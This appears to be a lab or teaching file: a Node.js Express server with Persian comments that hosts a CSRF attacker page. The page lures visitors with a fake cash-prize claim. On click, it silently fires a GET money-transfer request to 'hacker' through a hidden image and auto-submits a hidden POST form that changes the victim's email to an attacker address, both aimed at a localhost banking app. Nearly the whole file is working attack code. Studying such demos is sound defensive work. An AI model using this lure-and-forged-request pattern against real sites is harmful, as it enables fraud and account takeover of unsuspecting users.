const express = require('express');
const path = require('path');

const app = express();
app.use(express.static('public'));

// صفحه اصلی مهاجم
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🔥 سایت هدیه ویژه 🔥</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 50px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
                .card { background: white; padding: 30px; border-radius: 15px; max-width: 500px; margin: auto; }
                button { background: #ff6b6b; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; }
                .hidden { display: none; }
            </style>
        </head>
        <body>
            <div class="card">
                <h1>🎉 تبریک! شما برنده 10 میلیون تومان شده‌اید!</h1>
                <p>برای دریافت جایزه کلیک کنید:</p>
                <button onclick="attack()">دریافت جایزه</button>
                
                <div id="result" style="margin-top: 20px;"></div>
            </div>
            
            <!-- حمله مخفی -->
            <iframe id="hiddenFrame" style="display:none"></iframe>
            
            <script>
                function attack() {
                    // روش 1: حمله GET از طریق Image
                    const img = new Image();
                    img.src = 'http://localhost:3000/transfer?to=hacker&amount=5000';
                    img.style.display = 'none';
                    document.body.appendChild(img);
                    
                    // روش 2: حمله POST از طریق فرم خودکار
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = 'http://localhost:3000/change-email';
                    form.target = 'hiddenFrame';
                    
                    const input = document.createElement('input');
                    input.name = 'email';
                    input.value = 'hacked@attacker.com';
                    form.appendChild(input);
                    
                    document.body.appendChild(form);
                    form.submit();
                    
                    document.getElementById('result').innerHTML = 
                        '<p style="color:green">✅ جایزه شما در حال ارسال است...</p>' +
                        '<p style="color:red; font-size:12px">(در پس‌زمینه، عملیات بانکی انجام شد!)</p>';
                }
            </script>
        </body>
        </html>
    `);
});

app.listen(4000, () => {
    console.log('🔥 سایت مهاجم در: http://localhost:4000');
});